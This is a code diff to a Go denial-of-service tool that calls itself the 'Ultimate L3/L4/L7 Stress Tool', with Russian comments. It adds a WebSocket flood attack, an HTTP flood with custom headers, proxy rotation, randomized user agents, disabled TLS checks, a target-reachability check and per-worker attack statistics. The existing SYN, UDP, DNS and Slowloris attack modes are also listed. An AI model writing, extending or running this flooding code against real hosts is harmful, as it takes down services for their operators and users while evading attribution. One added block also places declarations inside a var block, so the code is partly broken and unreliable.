@@ -22,6 +22,7 @@ import (
 	"syscall"
 	"context"
 	"runtime"
+	"github.com/gorilla/websocket"
 )
 
 // #################### CONFIG ####################
@@ -59,6 +60,17 @@ var (
 		StartTime      time.Time
 		ActiveWorkers  int32
 	}{}
+
+	// --- Новые глобальные переменные для задач 3 и 5 ---
+	var (
+		customHeaders = make(map[string]string) // пользовательские заголовки
+		workerStats  []WorkerStat               // статистика по воркерам
+	)
+
+	type WorkerStat struct {
+		Requests uint64
+		Fails    uint64
+	}
 )
 
 // #################### MAIN ####################
@@ -224,6 +236,72 @@ func slowloris() {
 	}
 }
 
+// --- WebSocket атака (задача 1) ---
+func websocketFlood(workerID int) {
+	urlStr := targetURL()
+	if !strings.HasPrefix(urlStr, "ws") {
+		if useHTTPS {
+			urlStr = "wss://" + targetHost + targetPath
+		} else {
+			urlStr = "ws://" + targetHost + targetPath
+		}
+	}
+	for {
+		dialer := websocket.Dialer{
+			Proxy: http.ProxyFromEnvironment,
+		}
+		headers := http.Header{}
+		headers.Set("User-Agent", randomUserAgent())
+		for k, v := range customHeaders {
+			headers.Set(k, v)
+		}
+		c, _, err := dialer.Dial(urlStr, headers)
+		if err != nil {
+			workerStats[workerID].Fails++
+			continue
+		}
+		msg := randomPayload()
+		err = c.WriteMessage(websocket.TextMessage, msg)
+		if err == nil {
+			workerStats[workerID].Requests++
+		} else {
+			workerStats[workerID].Fails++
+		}
+		c.Close()
+	}
+}
+
+// --- HTTP Flood с поддержкой кастомных заголовков и статистики по воркерам (задачи 3 и 5) ---
+func httpFloodWithHeaders(workerID int) {
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+		Transport: &http.Transport{
+			DisableKeepAlives: true,
+			Proxy:            getProxyFunc(),
+			TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	for {
+		req, _ := http.NewRequest(randomMethod(), targetURL(), bytes.NewBuffer(randomPayload()))
+		req.Header.Set("User-Agent", randomUserAgent())
+		for k, v := range customHeaders {
+			req.Header.Set(k, v)
+		}
+		req.Header.Set("Accept", "*/*")
+		req.Header.Set("Connection", "close")
+		resp, err := client.Do(req)
+		if err == nil {
+			io.Copy(io.Discard, resp.Body)
+			resp.Body.Close()
+			workerStats[workerID].Requests++
+			atomic.AddUint64(&stats.TotalRequests, 1)
+		} else {
+			workerStats[workerID].Fails++
+			atomic.AddUint64(&stats.FailedRequests, 1)
+		}
+	}
+}
+
 // #################### PROXY MANAGEMENT ####################
 func loadProxies(filename string) {
 	file, err := os.Open(filename)
@@ -277,12 +355,30 @@ func proxyHealthChecker() {
 	}
 }
 
+// --- Проверка доступности цели (задача 2) ---
+func checkTargetAvailable() bool {
+	addr := fmt.Sprintf("%s:%d", targetHost, targetPort)
+	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
+	if err != nil {
+		return false
+	}
+	conn.Close()
+	return true
+}
+
 // #################### UTILS ####################
 func attackWorkerCtx(ctx context.Context, wg *sync.WaitGroup) {
 	defer wg.Done()
+	workerID := -1
+	if workerStats != nil {
+		workerID = int(atomic.AddInt32(&stats.ActiveWorkers, 1)) - 1
+	}
 	for {
 		select {
 		case <-ctx.Done():
+			if workerID >= 0 {
+				atomic.AddInt32(&stats.ActiveWorkers, -1)
+			}
 			return
 		default:
 			switch strings.ToUpper(attackType) {
@@ -306,6 +402,8 @@ func attackWorkerCtx(ctx context.Context, wg *sync.WaitGroup) {
 				httpFlood()
 			case "SLOWLORIS":
 				slowloris()
+			case "WEBSOCKET":
+				websocketFlood(workerID)
 			default:
 				log.Fatalf("❌ Unknown attack type: %s", attackType)
 			}
@@ -381,12 +479,21 @@ func targetURL() string {
 	return fmt.Sprintf("%s://%s:%d%s", scheme, targetHost, targetPort, targetPath)
 }
 
+// --- Парсинг пользовательских заголовков (задача 5) ---
+// Формат: HEADER1:VALUE1;HEADER2:VALUE2
+func parseCustomHeaders(arg string) {
+	pairs := strings.Split(arg, ";")
+	for _, pair := range pairs {
+		kv := strings.SplitN(pair, ":", 2)
+		if len(kv) == 2 {
+			customHeaders[strings.TrimSpace(kv[0])] = strings.TrimSpace(kv[1])
+		}
+	}
+}
+
 // #################### STATS ####################
 func printStats() {
-	ticker := time.NewTicker(5 * time.Second)
-	defer ticker.Stop()
-
-	for range ticker.C {
+	for range time.Tick(2 * time.Second) {
 		total := atomic.LoadUint64(&stats.TotalRequests)
 		failed := atomic.LoadUint64(&stats.FailedRequests)
 		success := total - failed
@@ -394,16 +501,17 @@ func printStats() {
 		if total > 0 {
 			rate = float64(success) / float64(total) * 100
 		}
-
 		elapsed := time.Since(stats.StartTime).Seconds()
 		var rps float64
 		if elapsed > 0 {
 			rps = float64(total) / elapsed
 		}
 		active := atomic.LoadInt32(&stats.ActiveWorkers)
-
-		log.Printf("📊 Reqs: %d (%.1f/s) | Active: %d | Success: %.1f%% | Failed: %d",
-			total, rps, active, rate, failed)
+		log.Printf("📊 Reqs: %d (%.1f/s) | Active: %d | Success: %.1f%% | Failed: %d", total, rps, active, rate, failed)
+		// --- Подробная статистика по воркерам (задача 3) ---
+		for i, ws := range workerStats {
+			log.Printf("  Worker %d: Requests: %d, Fails: %d", i, ws.Requests, ws.Fails)
+		}
 	}
 }
 
@@ -470,11 +578,22 @@ func parseArgs() {
 		log.Printf("⚠️  Threads capped at %d", MaxWorkers)
 		threads = MaxWorkers
 	}
+
+	if len(os.Args) > 6 {
+		parseCustomHeaders(os.Args[6])
+	}
+
+	workerStats = make([]WorkerStat, threads)
+
+	// Проверка доступности цели (задача 2)
+	if !checkTargetAvailable() {
+		log.Fatal("❌ Target is not available (connection failed)")
+	}
 }
 
 func printUsage() {
 	fmt.Printf("Ultimate L3/L4/L7 Stress Tool v%s\n", Version)
-	fmt.Println("Usage: go run main.go <target> <type> <threads> <duration> [size]")
+	fmt.Println("Usage: go run main.go <target> <type> <threads> <duration> [size] [headers]")
 	fmt.Println("\nTarget Examples:")
 	fmt.Println("  example.com         - Default port 80")
 	fmt.Println("  example.com:443     - Custom port")
@@ -482,8 +601,8 @@ func printUsage() {
 	fmt.Println("\nAttack Types:")
 	fmt.Println("  L3: SYN, ICMP")
 	fmt.Println("  L4: TCP, UDP, DNS")
-	fmt.Println("  L7: HTTP, HTTPS, SLOWLORIS")
+	fmt.Println("  L7: HTTP, HTTPS, SLOWLORIS, WEBSOCKET")
 	fmt.Println("\nExample:")
-	fmt.Println("  go run main.go example.com SYN 1000 60")
-	fmt.Println("  go run main.go https://example.com HTTP 5000 120 2048")
+	fmt.Println("  go run main.go ws://example.com:8080 WEBSOCKET 1000 60")
+	fmt.Println("  go run main.go https://example.com HTTP 5000 120 2048 \"X-Api-Key:123;X-Test:1\"")
 }
